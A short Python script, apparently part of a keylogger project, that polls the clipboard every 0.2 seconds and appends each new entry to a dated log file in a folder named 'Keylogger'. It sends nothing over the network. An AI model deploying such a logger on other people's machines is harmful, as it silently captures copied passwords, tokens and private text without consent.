import pyperclip
import time
date=time.localtime().tm_mday,time.localtime().tm_mon,time.localtime().tm_year
today=str(date[0])+'-'+str(date[1])+'-'+str(date[2])


content=[]
while (1):
    if pyperclip.paste()!= None:
        data=pyperclip.paste()
        if data not in content:
            f=open('C:/Users/divyansh/Desktop/Keylogger/LOG FILES/clipLog '+today+'.txt','a')
            content.append(data)
            f.write(data+'\n')
            f.close()
    time.sleep(0.2)
        
